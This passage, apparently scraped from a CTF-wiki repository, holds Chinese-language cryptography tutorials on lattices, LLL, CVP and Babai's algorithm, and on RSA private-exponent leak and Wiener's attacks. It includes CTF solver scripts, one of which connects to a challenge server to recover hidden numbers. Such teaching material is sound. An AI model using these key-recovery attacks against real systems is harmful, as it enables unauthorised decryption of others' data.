2))[2:-1]\n\t\tprint M\n```\n\n输出之后再解码下\n\n```python\n295 [1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0]\n415349535f3962643364356664323432323638326331393536383830366130373036316365\n>>> import binascii\n>>> binascii.unhexlify('415349535f3962643364356664323432323638326331393536383830366130373036316365')\n'ASIS_9bd3d5fd2422682c19568806a07061ce'\n```\n\n需要注意的是，我们得到的 LLL 攻击得到的矩阵 res 的只包含 01 值的行才是我们想要的结果，因为我们对于明文加密时，会将其分解为二进制比特串。此外，我们还需要去掉对应哪一行的最后一个数字。\n\nflag 是 `ASIS_9bd3d5fd2422682c19568806a07061ce`。\n\n### 题目\n\n- 2017 国赛 classic\n", "timestamp": "2025-10-21T22:02:46.507697"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/crypto/asymmetric/lattice/cvp.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/asymmetric/lattice/cvp.md", "content": "# CVP\n\nCVP是Lattice-based cryptography中尤为重要的一个问题。\n\n问题的基本定义如下：给定格$L$的一组基与向量$\\mathbf{v}$，找到在$L$上离$\\mathbf{v}$最近的一个向量。\n\n<!--\nTODO: Add more Lattice-based cryptography (CVP specifically) application intro here.\nTODO: Make intro more descriptive and rigorous.\n-->\n\n## Algorithms\n\n### Babai's nearest plane algorithm\n\n<!--\nTODO: Add intro\n-->\n\n该算法输入一组格$L$(秩为$n$)的基$B$和一个目标向量$\\mathbf{t}$，输出CVP问题的近似解。\n\n* 近似因子为$\\gamma = 2^{\\frac{n}{2}}$\n\n具体算法：\n\n![](figure/babai_1.png)\n\n* 其中$c_j$为Gram-schmidt正交化中的系数取整，也即$proj_{b_{j}}(b)$的取整。\n\n对于该算法第二步的个人理解：在格基规约和正交化过后的基$B$中找到一个最靠近$\\mathbf{t}$的线性组合。\n\n### Babai’s Rounding Technique\n\n该算法是`Babai's nearest plane algorithm`的一个变种。\n\n步骤可以表示为：\n\n```\nN = rank(B), w = target\n- B' = LLL(B)\n- Find a linear combination [l_0, ... l_N] such that w = sum(l_i * b'_i).\n* (b'_i is the i-th vector in the LLL-reduced basis B')\n- Round each l_i to it's closest integer l'_i.\n- Result v = sum(l'_i * b'_i)\n```\n\n## 相关内容\n\n### Hidden number problem\n\nHNP的定义如下：\n\n给定质数$p$、许多$t \\in \\mathbb{F}_p$以及每一个对应的$MSB_{l,p}(\\alpha t)$，找出对应的$\\alpha$。\n\n* $MSB_{l,p}(x)$表示任一满足 $\\lvert (x \\mod p) - u \\rvert \\le \\frac{p}{2^{l+1}}$ 的整数 $u$，近似为取$x \\mod p$的$l$个最高有效位。\n\n根据参考3中的描述，当$l \\approx \\log^{\\frac{1}{2}}{p}$时，有如下算法可以解决HNP：\n\n我们可以将此问题转化为一个由该矩阵生成的格上的CVP问题：\n\n$\\left[ \\begin{matrix} p & 0 & \\dots & 0 & 0 \\\\ 0 & p & \\ddots & \\vdots & \\vdots \\\\ \\vdots & \\ddots & \\ddots & 0 & \\vdots \\\\ 0 & 0 & \\dots & p & 0 \\\\ t_1 & t_2 & \\dots & t_{n} & \\frac{1}{2^{l+1}} \\end{matrix} \\right]$\n\n我们需要找到在格上离$\\mathbf{u}=(u_1, u_2, \\dots, u_{n}, 0)$最近的向量，所以在这里，我们可以采用`Babai's nearest plane algorithm`。最终我们可以得到一组向量 $\\mathbf{v}=(\\alpha \\cdot t_1 \\mod p, \\alpha \\cdot t_2 \\mod p, \\dots, \\frac{\\alpha}{2^{l+1}})$，从而算出 $\\alpha$。\n\n### BCTF 2018 - guess_number\n\n题目提供了服务器端的代码：\n```python\nimport random, sys\nfrom flag import FLAG\nimport gmpy2\n\ndef msb(k, x, p):\n    delta = p >> (k + 1)\n    ui = random.randint(x - delta, x + delta)\n    return ui\n\ndef main():\n    p = gmpy2.next_prime(2**160)\n    for _ in range(5):\n        alpha = random.randint(1, p - 1)\n        # print(alpha)\n        t = []\n        u = []\n        k = 10\n        for i in range(22):\n            t.append(random.randint(1, p - 1))\n            u.append(msb(k, alpha * t[i] % p, p))\n        print(str(t))\n        print(str(u))\n        guess = raw_input('Input your guess number: ')\n        guess = int(guess)\n        if guess != alpha:\n            exit(0)\n\nif __name__ == \"__main__\":\n    main()\n    print(FLAG)\n```\n\n可以看到，程序一共执行5轮。在每一轮，程序会生成一个随机的$\\alpha$和22个随机的$t_i$。对于每一个$t_i$，程序会取$u_i = MSB_{10,p}(\\alpha\\cdot{t_i\\mod{p}})$，随后发送给客户端。我们需要根据提供的$t_i$和$u_i$计算出对应的$\\alpha$。可以看到，该问题是一个典型的Hidden number problem，于是可以使用上述算法解决：\n\n```python\nimport socket\nimport ast\nimport telnetlib\n\n#HOST, PORT = 'localhost', 9999\nHOST, PORT = '60.205.223.220', 9999\n\ns = socket.socket()\ns.connect((HOST, PORT))\nf = s.makefile('rw', 0)\n\ndef recv_until(f, delim='\\n'):\n    buf = ''\n    while not buf.endswith(delim):\n        buf += f.read(1)\n    return buf\n\np = 1461501637330902918203684832716283019655932542983\nk = 10\n\ndef solve_hnp(t, u):\n    # http://www.isg.rhul.ac.uk/~sdg/igor-slides.pdf\n    M = Matrix(RationalField(), 23, 23)\n    for i in xrange(22):\n        M[i, i] = p\n        M[22, i] = t[i]\n\n    M[22, 22] = 1 / (2 ** (k + 1))\n\n    def babai(A, w):\n        A = A.LLL(delta=0.75)\n        G = A.gram_schmidt()[0]\n        t = w\n        for i in reversed(range(A.nrows())):\n            c = ((t * G[i]) / (G[i] * G[i])).round()\n            t -= A[i] * c\n        return w - t\n\n    closest = babai(M, vector(u + [0]))\n    return (closest[-1] * (2 ** (k + 1))) % p\n\nfor i in xrange(5):\n    t = ast.literal_eval(f.readline().strip())\n    u = ast.literal_eval(f.readline().strip())\n    alpha = solve_hnp(t, u)\n    recv_until(f, 'number: ')\n    s.send(str(alpha) + '\\n')\n\nt = telnetlib.Telnet()\nt.sock = s\nt.interact()\n```\n\n## 参考\n\n* [Lecture 3 - CVP algorithm](https://cims.nyu.edu/~regev/teaching/lattices_fall_2004/ln/cvp.pdf)\n* [Wikipedia](https://en.wikipedia.org/wiki/Lattice_problem)\n* [Playing “Hide-and-Seek” in Finite Fields: Hidden Number Problem and Its Applications](http://www.isg.rhul.ac.uk/~sdg/igor-slides.pdf)\n* https://www.math.auckland.ac.nz/~sgal018/crypto-book/ch18.pdf\n", "timestamp": "2025-10-21T22:02:46.772787"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/crypto/asymmetric/lattice/introduction.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/asymmetric/lattice/introduction.md", "content": "# 基本介绍\n\n## 格定义\n\n格是 m 维欧式空间 $R^m$ 的 n ($m\\geq n$) 个线性无关向量$b_i(1\\leq i \\leq n)$ 的所有整系数的线性组合，即\n$L(B)=\\{\\sum\\limits_{i=1}^{n}x_ib_i:x_i \\in Z,1\\leq i \\leq n\\}$\n\n这里 B 就是 n 个向量的集合，我们称\n\n- 这 n 个向量是格 L 的一组基。\n- 格 L 的秩为 n。\n- 格 L 的位数为 m。\n\n如果 m=n，那么我们称这个格式满秩的。\n\n当然，也可以是其它群，不是 $R^m$。\n\n## 格中若干基本定义\n\n### successive minima\n\n格是 m 维欧式空间 $R^m$ 的秩为 n 的格，那么 L 的连续最小长度(successive minima)为 $\\lambda_1,...,\\lambda_n \\in R$，满足对于任意的 $1\\leq i\\leq n$，$\\lambda_i$ 是满足格中 i 个线性无关的向量$v_i$， $||v_j||\\leq \\lambda_i,1\\leq j\\leq i$ 的最小值。\n\n自然的 $\\lambda_i \\leq \\lambda_j ,\\forall i <j$。\n\n## 格中计算困难性问题\n\n**最短向量问题(Shortest Vector Problem，SVP)**：给定格 L 及其基向量 B ，找到格 L 中的非零向量 v 使得对于格中的任意其它非零向量 u，$||v|| \\leq ||u||$。\n\n**$\\gamma$-近似最短向量问题(SVP-$\\gamma$)**：给定格 L，找到格 L 中的非零向量 v 使得对于格中的任意其它非零向量 u，$||v|| \\leq \\gamma||u||$。\n\n**连续最小长度问题(Successive Minima Problem, SMP)**:给定秩为 n 的格 L，找到格 L 中 n 个线性无关向量 $s_i$，满足 $\\lambda_i(L)=||s_i||, 1\\leq i \\leq n$。\n\n**最短线性无关向量问题(Shortest Independent Vector Problem, SIVP)**：给定一个秩为 n 的格 L，找到格 L 中 n 个线性无关向量 $s_i$，满足$||s_i|| \\leq \\lambda_n(L), 1\\leq i \\leq n$。\n\n**唯一最短向量问题(Unique Shortest Vector Problem, uSVP-$\\gamma$)**：给定格 L，满足 $ \\lambda_2(L) > \\gamma \\lambda_1(L)$，找到该格的最短向量。\n\n**最近向量问题(Closest Vector Problem，CVP)**：给定格 L和目标向量 $t\\in R^m$，找到一个格中的非零向量 v，使得对于格中的任意非零向量 u，满足 $||v-t|| \\leq ||u-t||$ 。\n\n\n\n", "timestamp": "2025-10-21T22:02:47.039293"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/crypto/asymmetric/lattice/lattice-reduction.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/asymmetric/lattice/lattice-reduction.md", "content": "# 格基规约算法\n\n## Lenstra–Lenstra–Lovasz\n\n### 基本介绍\n\nLLL 算法就是在格上找到一组基，满足如下效果\n\n\n![image-20180717213241784](figure/lll-def.png)\n\n\n\n而且，这种方法生成的基所具有的如下性质是非常有用的\n\n![image-20180717213519622](figure/lll-property.png)\n\n### 简单应用\n\n这里我举一下 LLL paper 中给的第二个例子。给定 n 个实数 $\\alpha_i,...,\\alpha_n$，找到这 n 个数的有理线性逼近，即找到 n 个数 $m_i$，使得 $\\sum\\limits_{i=1}^{n}m_i\\alpha_i$ 尽可能等于 0。 我们可以构造这样的矩阵，这里 $a_i$ 为 $\\alpha_i$ 的有理逼近。\n\n\n$$ A = \\left[ \\begin{matrix} 1   & 0 & 0     & \\cdots & 0 & ca_1     \\\\ 0   & 1  & 0    & \\cdots & 0 & c a_2  \\\\ 0   & 0   & 1   & \\cdots & 0 & c a_3 \\\\\\vdots & \\vdots & \\vdots & \\ddots & \\vdots \\\\ 0   & 0   &0   & \\cdots & 1 & c a_n     \\\\ \\end{matrix} \\right]$$\n\n矩阵为 n*(n+1) 的，我们可以根据格求行列式的方法来求一下这个格对应的行列式。\n\n$det(L)=\\sqrt{AA^T}$\n\n我们进一步考虑这样的矩阵\n\n$$ A = \\left[ \\begin{matrix} 1   & 0 & 0     & \\cdots & 0 & a_1     \\\\ 0   & 1  & 0    & \\cdots & 0 & a_2  \\\\ 0   & 0   & 1   & \\cdots & 0 & a_3 \\\\\\vdots & \\vdots & \\vdots & \\ddots & \\vdots \\\\ 0   & 0   &0   & \\cdots & 1 & a_n     \\\\ \\end{matrix} \\right]$$\n\n那么\n\n$$ AA^T = \\left[ \\begin{matrix} 1+a_1^2   & a_1a_2   & a_1a_3 & \\cdots  & a_1a_n     \\\\ a_2a_1   & 1+a_2^2  & a_2a_3 & \\cdots & a_2a_n  \\\\ a_3a_1   & a_3a_2   & 1+a_3^2   & \\cdots  & a_3a_n \\\\ \\vdots & \\vdots & \\vdots & \\ddots & \\vdots \\\\ a_na_1   & a_na_2   &a_na_3   & \\cdots  & 1+a_n^2     \\\\ \\end{matrix} \\right]$$\n\n进一步我们从低维到高维大概试一试（严格证明，可以考虑添加一行和一列，左上角为1），得到格的行列式为\n\n$\\sqrt{1+\\sum\\limits_{i=1}^n\\alpha_i^2}$\n\n可以参见考研宇哥的如下证明\n\n![](figure/lll-application2.png)\n\n那么经过 LLL 算法后，我们可以获得\n\n$||b_1|| \\leq 2^{\\frac{n-1}{4}} (1+\\sum\\limits_{i=1}^n\\alpha_i^2)^{\\frac{1}{2n}}$\n\n一般来说后一项在开 n 次方时趋向于1，因为 $a_i$ 都是常数，一般不会和 n 相关，所以\n\n$||b_1|| \\leq 2^{\\frac{n-1}{4}}*k$\n\nk 比较小。此外，$b_1$ 又是原向量的线性组合，那么\n\n$b_1[n]=\\sum\\limits_{i=1}^{n}m_ic*a_i=c\\sum\\limits_{i=1}^{n}m_i*a_i$\n\n显然如果 c 足够大，那么后面的求和必须足够小，才可以满足上面的约束。\n\n\n## 参考\n\n- Survey: Lattice Reduction Attacks on RSA\n", "timestamp": "2025-10-21T22:02:47.146509"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/crypto/asymmetric/lattice/overview.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/asymmetric/lattice/overview.md", "content": "# 格概述\n\n格在数学上至少有两种含义\n\n- 定义在非空有限集合上的偏序集合 L，满足集合 L 中的任意元素 a，b，使得 a，b 在 L 中存在一个最大下界，和最小上界。具体参见https://en.wikipedia.org/wiki/Lattice_(order)。\n- 群论中的定义，是 $R^n$ 中的满足某种性质的子集。当然，也可以是其它群。\n\n目前关于格方面的研究主要有以下几大方向\n\n1. 格中计算问题的困难性，即这些问题的计算复杂性，主要包括 \n    1. SVP 问题\n    2. CVP 问题\n2. 如何求解格中的困难性问题，目前既有近似算法，也有一些精确性算法。\n3. 基于格的密码分析，即如何利用格理论分析一些已有的密码学算法，目前有如下研究\n    1. Knapsack cryptosystems\n    2. DSA nonce biases\n    3. Factoring RSA keys with bits known\n    4. Small RSA private exponents\n    5. Stereotyped messages with small RSA exponents\n4. 如何基于格困难问题设计新的密码体制，这也是后量子密码时代的重要研究方向之一，目前有以下研究\n    1. Fully homomorphic encryption\n    2. The Goldreich–Goldwasser–Halevi (GGH) cryptosystem\n    3. The NTRU cryptosystem\n    4. The Ajtai–Dwork cryptosystem and the LWE cryptosystem\n\n", "timestamp": "2025-10-21T22:02:47.252881"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/crypto/asymmetric/rsa/d_attacks/rsa_d_attack.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/asymmetric/rsa/d_attacks/rsa_d_attack.md", "content": "# 私钥 d 相关攻击\n\n## d 泄露攻击\n\n### 攻击原理\n\n首先当 $d$ 泄露之后，我们自然可以解密所有加密的消息。我们甚至还可以对模数 N 进行分解。其基本原理如下\n\n我们知道 $ed \\equiv 1 \\bmod \\varphi(n)$，那么存在一个 $k$ 使得 \n\n$$\ned-1=k\\varphi(n)\n$$\n\n又 $\\forall a\\in {Z}_n^*$，满足$a^{ed-1}\\equiv1(\\bmod n)$。令\n\n$$\ned-1=2^st\n$$\n\n其中，$t$ 是一个奇数。然后可以证明对于至少一半的 $a\\in {Z}_n^*$，存在一个 $i\\in[1,s]$，使得 \n\n$$\na^{2^{i-1}t}\\not\\equiv\\pm1(\\bmod n),a^{2^{i}t}\\equiv1(\\bmod n)\n$$\n\n成立。如果 $a,i$ 满足上述条件，$gcd(a^{2^{i-1}t}-1,n)$是 $n$ 的一个非平凡因子，所以可以对 $n$ 进行暴力分解。\n\n### 工具\n\n利用以下工具可以直接进行计算\n\n- RsaConverter.exe (https://sourceforge.net/projects/rsaconverter/ , for windows )\n- [rsatool.py](https://github.com/ius/rsatool/blob/master/rsatool.py)(分解原理如上)\n\n\n### 2017 HITB - hack in the card II\n\n> The second smart card sent to us has been added some countermeasures by that evil company. They also changed the public key(attachments -> publickey.pem). However it seems that they missed something......  \n> Can you decrypt the following hex-encoded ciphertext this time?  \n> ```\n> 016d1d26a470fad51d52e5f3e90075ab77df69d2fb39905fe634ded81d10a5fd10c35e1277035a9efabb66e4d52fd2d1eaa845a93a4e0f1c4a4b70a0509342053728e89e977cfb9920d5150393fe9dcbf86bc63914166546d5ae04d83631594703db59a628de3b945f566bdc5f0ca7bdfa819a0a3d7248286154a6cc5199b99708423d0749d4e67801dff2378561dd3b0f10c8269dbef2630819236e9b0b3d3d8910f7f7afbbed29788e965a732efc05aef3194cd1f1cff97381107f2950c935980e8954f91ed2a653c91015abea2447ee2a3488a49cc9181a3b1d44f198ff9f0141badcae6a9ae45c6c75816836fb5f331c7f2eb784129a142f88b4dc22a0a977\n> ```\n\n这题是接续 2017 HITB - hack in the card I 的一道题，我们直接使用 `openssl` 查看 `publickey.pem` 的公钥，发现它的 N 与上一道题的 N 相同，并且上题的 N，e，d 已知。由此可直接使用上面的 `rsatool.py` 得到 p，q，并通过本题的 e 计算出 e 得到明文。\n\n## Wiener's Attack\n\n### 攻击条件\n\n在 d 比较小（$d<\\frac{1}{3}N^{\\frac{1}{4}}$）时，攻击者可以使用 **Wiener's Attack** 来获得私钥。\n\n### 攻击原理\n\n- https://en.wikipedia.org/wiki/Wiener%27s_attack\n- https://sagi.io/2016/04/crypto-classics-wieners-rsa-attack/\n\n### 工具\n\n- https://github.com/pablocelayes/rsa-wiener-attack\n- https://github.com/orisano/owiener\n\n## 综合例子\n\n### 2016 HCTF RSA1\n\n这里我们以 2016 年 HCTF 中 RSA 1 - Crypto So Interesting 为例进行分析，[源代码链接](https://github.com/Hcamael/ctf-library/tree/master/RSA1)。\n\n首先先绕过程序的 proof 部分，差不多使用一些随机的数据就可以绕过。\n\n其次，我们来分析一下具体的代码部分，程序是根据我们的 token 来获取 flag 的，这里我们就直接利用源代码中提供的 token。\n\n```python\n\tprint \"This is a RSA Decryption System\"\n\tprint \"Please enter Your team token: \"\n\ttoken = raw_input()\n\ttry:\n\t\tflag = get_flag(token)\n\t\tassert len(flag) == 38\n\texcept:\n\t\tprint \"Token error!\"\n\t\tm_exit(-1)\n```\n\n接下来我们首先知道 $n=pq$，我们再来你仔细分析一下这个 e，d 是如何得到的。\n\n```python\n\tp=getPrime(2048)\n\tq=getPrime(2048)\n\tn = p * q\n\te, d = get_ed(p, q)\n\tprint \"n: \", hex(n)\n\tprint \"e: \", hex(e)\n```\n\n`get_ed` 函数如下\n\n```python\ndef get_ed(p, q):\n\tk = cal_bit(q*p)\n\tphi_n = (p-1)*(q-1)\n\tr = random.randint(10, 99)\n\twhile True:\n\t\tu = getPrime(k/4 - r)\n\t\tif gcd(u, phi_n) != 1:\n\t\t\tcontinue\n\t\tt = invmod(u, phi_n)\n\t\te = pi_b(t)\n\t\tif gcd(e, phi_n) == 1:\n\t\t\tbreak\n\td = invmod(e, phi_n)\n\treturn (e, d)\n```\n\n可以看出，我们得到的 u 的位数比 n 的位数的四分之一还要少，这里其实就差不多满足了 Wiener's Attack 了。而且我们计算出来的 u，t，e，d 还满足以下条件\n\n$$\n\\begin{align*}\nut &\\equiv 1  \\bmod \\varphi(n) \\\\\net &\\equiv 1 \\bmod bt \\\\\ned &\\equiv 1 \\bmod \\varphi(n)\n\\end{align*}\n$$\n\n根据题中给出的条件，我们已经知道了 n，e，bt。\n\n所以首先我们可以根据上面的第二个式子知道 e。这时候，可以利用第一个式子进行 Wiener's Attack，获取 u。进而这时我们可以利用私钥指数泄露攻击的方法来分解 N 从而得到 p，q。进而我们就可以得到 d 了。\n\n首先我们绕过 proof 得到了 N，e，加密后的 flag 如下\n\n```shell\nn:  0x4b4403cd5ac8bdfaa3bbf83decdc97db1fbc7615fd52f67a8acf7588945cd8c3627211ffd3964d979cb1ab3850348a453153710337c6fe3baa15d986c87fca1c97c6d270335b8a7ecae81ae0ebde48aa957e7102ce3e679423f29775eef5935006e8bc4098a52a168e07b75e431a796e3dcd29c98dab6971d3eac5b5b19fb4d2b32f8702ef97d92da547da2e22387f7555531af4327392ef9c82227c5a2479623dde06b525969e9480a39015a3ed57828162ca67e6d41fb7e79e1b25e56f1cff487c1d0e0363dc105512d75c83ad0085b75ede688611d489c1c2ea003c3b2f81722cdb307a3647f2da01fb3ba0918cc1ab88c67e1b6467775fa412de7be0b44f2e19036471b618db1415f6b656701f692c5e841d2f58da7fd2bc33e7c3c55fcb8fd980c9e459a6df44b0ef70b4b1d813a57530446aa054cbfb9d1a86ffb6074b6b7398a83b5f0543b910dcb9f111096b07a98830a3ce6da47cd36b7c1ac1b2104ea60dc198c34f1c50faa5b697f2f195afe8af5d455e8ac7ca6eda669a5a1e3bfbd290a4480376abd1ff21298d529b26a4e614ab24c776a10f5f5d8e8809467a3e81f04cf5d5b23eb4a3412886797cab4b3c5724c077354b2d11d19ae4e301cd2ca743e56456d2a785b650c7e1a727b1bd881ee85c8d109792393cc1a92a66b0bc23b164146548f4e184b10c80ec458b776df10405b65399e32d657bc83e1451\ne:  0x10194521505692a64d043daaef7647e0efb1503ec89220a0e4148ab53ecf708146a8893a2e700e4f2f062be14a3ab4e46339a939d5c7289904cc0ab043320d3a4d7da868bf5736ae5f787d6c0e3d9b8cc4b81314ad6c5ff643bc0d8946fea7eb09bf707a54747a39df1cfc0c30849770578cb63de86621001ce86a11874c91419a4d07373e66e94f31b988cac3aeaff88c7abaf3b78468a434990f7854e734208a7461f8245660fa8301f979e85517d705302c797dbdf2938cc442b01c228939eb73aa29651a198a332af2bb982310699684e5a0595c7413ec01eefb3613a9ea4b59f1de984ad4bf6654960613c0f8104b4e41fb33384e07f715176d68f4bb7613b1258675e70dc774f701aee053830f0be28ba9f308c9fe1707a5ba07a2027d74144b8aeb4042df3c1d73d9c38c2d7d1a890fd70d6e38c72da5d075f3811c0354dcecdd836a59112a70be22757278c5e4973906aaeeadd6f61d0845d6f9761df191b0b2527d122dd07f8bd07f5cd14268246ac2b93b778c84b5157f7eb23a8eaa9f0f885f2a38e3fb8fd1012d9b6c841cea8d9d73b232bef298afd086c1063bdd11e0777c8d2ec91ae843a67a98039cb53fad0ee25040176841a017fabf79b98de21d40bc6985f82dd84406aad26e9ac9bc5f6e12385230d9620b888c201ca9c413cbf0f36b100a6c62c5c8f065934fcf9f9f0179eea35888cb357b704441c1\nflag:  0x2517d1866acc5b7b802a51d6251673262e9e6b2d0e0e14a87b838c2751dee91e4ea29019b0a7877b849fddf9e08580d810622db538462b529412eba9d0f8a450fe1889021c0bbd12a62ccc3fff4627b1dbdebec3a356a066adc03f7650722a34fe41ea0a247cb480a12286fffc799d66b6631a220b8401f5f50daa12943856b35e59abf8457b2269efea14f1535fb95e56398fd5f3ac153e3ea1afd7b0bb5f02832883da46343404eb44594d04bbd254a9a35749af84eaf4e35ba1c5571d41cab4d58befa79b6745d8ecf93b64dd26056a6d1e82430afbff3dbc08d6c974364b57b30c8a8230c99f0ec3168ac4813c4205d9190481282ae14f7b94400caff3786ed35863b66fefcffbef1ad1652221746a5c8da083987b2b69689cf43e86a05ce4cf059934716c455a6410560e41149fbcf5fcea3c210120f106b8f6269b9a954139350626cf4dcb497ce86264e05565ec6c6581bf28c643bb4fab8677148c8034833cedacb32172b0ff21f363ca07de0fa2882ac896954251277adc0cdd0c3bd5a3f107dbebf5f4d884e43fe9b118bdd51dc80607608670507388ae129a71e0005826c7c82efccf9c86c96777d7d3b9b5cce425e3dcf9aec0643f003c851353e36809b9202ff3b79e8f33d40967c1d36f5d585ac9eba73611152fc6d3cf36fd9a60b4c621858ed1f6d4db86054c27828e22357fa3d7c71559d175ff8e8987df\n\n```\n\n其次使用如下方法进行 Wiener's Attack 得到 u，如下\n\n```python\nif __name__ == \"__main__\":\n    bt = 536380958350616057242691418634880594502192106332317228051967064327642091297687630174183636288378234177476435270519631690543765125295554448698898712393467267006465045949611180821007306678935181142803069337672948471202242891010188677287454504933695082327796243976863378333980923047411230913909715527759877351702062345876337256220760223926254773346698839492268265110546383782370744599490250832085044856878026833181982756791595730336514399767134613980006467147592898197961789187070786602534602178082726728869941829230655559180178594489856595304902790182697751195581218334712892008282605180395912026326384913562290014629187579128041030500771670510157597682826798117937852656884106597180126028398398087318119586692935386069677459788971114075941533740462978961436933215446347246886948166247617422293043364968298176007659058279518552847235689217185712791081965260495815179909242072310545078116020998113413517429654328367707069941427368374644442366092232916196726067387582032505389946398237261580350780769275427857010543262176468343294217258086275244086292475394366278211528621216522312552812343261375050388129743012932727654986046774759567950981007877856194574274373776538888953502272879816420369255752871177234736347325263320696917012616273L\n    e = 0x10194521505692a64d043daaef7647e0efb1503ec89220a0e4148ab53ecf708146a8893a2e700e4f2f062be14a3ab4e46339a939d5c7289904cc0ab043320d3a4d7da868bf5736ae5f787d6c0e3d9b8cc4b81314ad6c5ff643bc0d8946fea7eb09bf707a54747a39df1cfc0c30849770578cb63de86621001ce86a11874c91419a4d07373e66e94f31b988cac3aeaff88c7abaf3b78468a434990f7854e734208a7461f8245660fa8301f979e85517d705302c797dbdf2938cc442b01c228939eb73aa29651a198a332af2bb982310699684e5a0595c7413ec01eefb3613a9ea4b59f1de984ad4bf6654960613c0f8104b4e41fb33384e07f715176d68f4bb7613b1258675e70dc774f701aee053830f0be28ba9f308c9fe1707a5ba07a2027d74144b8aeb4042df3c1d73d9c38c2d7d1a890fd70d6e38c72da5d075f3811c0354dcecdd836a59112a70be22757278c5e4973906aaeeadd6f61d0845d6f9761df191b0b2527d122dd07f8bd07f5cd14268246ac2b93b778c84b5157f7eb23a8eaa9f0f885f2a38e3fb8fd1012d9b6c841cea8d9d73b232bef298afd086c1063bdd11e0777c8d2ec91ae843a67a98039cb53fad0ee25040176841a017fabf79b98de21d40bc6985f82dd84406aad26e9ac9bc5f6e12385230d9620b888c201ca9c413cbf0f36b100a6c62c5c8f065934fcf9f9f0179eea35888cb357b704441c1\n    t = gmpy2.invert(e, bt)\n    n = 0x4b4403cd5ac8bdfaa3bbf83decdc97db1fbc7615fd52f67a8acf7588945cd8c3627211ffd3964d979cb1ab3850348a453153710337c6fe3baa15d986c87fca1c97c6d270335b8a7ecae81ae0ebde48aa957e7102ce3e679423f29775eef5935006e8bc4098a52a168e07b75e431a796e3dcd29c98dab6971d3eac5b5b19fb4d2b32f8702ef97d92da547da2e22387f7555531af4327392ef9c82227c5a2479623dde06b525969e9480a39015a3ed57828162ca67e6d41fb7e79e1b25e56f1cff487c1d0e0363dc105512d75c83ad0085b75ede688611d489c1c2ea003c3b2f81722cdb307a3647f2da01fb3ba0918cc1ab88c67e1b6467775fa412de7be0b44f2e19036471b618db1415f6b656701f692c5e841d2f58da7fd2bc33e7c3c55fcb8fd980c9e459a6df44b0ef70b4b1d813a57530446aa054cbfb9d1a86ffb6074b6b7398a83b5f0543b910dcb9f111096b07a98830a3ce6da47cd36b7c1ac1b2104ea60dc198c34f1c50faa5b697f2f195afe8af5d455e8ac7ca6eda669a5a1e3bfbd290a4480376abd1ff21298d529b26a4e614ab24c776a10f5f5d8e8809467a3e81f04cf5d5b23eb4a3412886797cab4b3c5724c077354b2d11d19ae4e301cd2ca743e56456d2a785b650c7e1a727b1bd881ee85c8d109792393cc1a92a66b0bc23b164146548f4e184b10c80ec458b776df10405b65399e32d657bc83e1451\n    solve(n, t)\n```\n\n其中 solve 函数就是对应的 Wiener's Attack 的函数。\n\n我们得到了 u，如下\n\n```shell\n➜  rsa-wiener-attack git:(master) ✗ python RSAwienerHacker.py\nTesting Wiener Attack\nHacked!\n('hacked_d = ', mpz(404713159471231711408151571380906751680333129144247165378555186876078301457022630947986647887431519481527070603810696638453560506186951324208972060991323925955752760273325044674073649258563488270334557390141102174681693044992933206572452629140703447755138963985034199697200260653L))\n-------------------------\nHacked!\n('hacked_d = ', mpz(404713159471231711408151571380906751680333129144247165378555186876078301457022630947986647887431519481527070603810696638453560506186951324208972060991323925955752760273325044674073649258563488270334557390141102174681693044992933206572452629140703447755138963985034199697200260653L))\n-------------------------\nHacked!\n('hacked_d = ', mpz(404713159471231711408151571380906751680333129144247165378555186876078301457022630947986647887431519481527070603810696638453560506186951324208972060991323925955752760273325044674073649258563488270334557390141102174681693044992933206572452629140703447755138963985034199697200260653L))\n-------------------------\nHacked!\n('hacked_d = ', mpz(404713159471231711408151571380906751680333129144247165378555186876078301457022630947986647887431519481527070603810696638453560506186951324208972060991323925955752760273325044674073649258563488270334557390141102174681693044992933206572452629140703447755138963985034199697200260653L))\n-------------------------\nHacked!\n('hacked_d = ', 